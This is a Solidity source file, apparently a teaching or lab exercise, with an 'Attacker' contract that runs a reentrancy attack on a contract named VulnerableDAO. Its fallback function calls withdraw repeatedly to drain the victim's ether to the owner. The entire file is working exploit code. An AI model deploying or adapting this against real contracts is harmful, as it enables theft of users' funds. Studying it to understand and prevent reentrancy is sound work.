// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableDAO.sol";

contract Attacker {
    VulnerableDAO public victim;
    address public owner;

    constructor(address _victim) {
        victim = VulnerableDAO(_victim);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    }

    fallback() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}
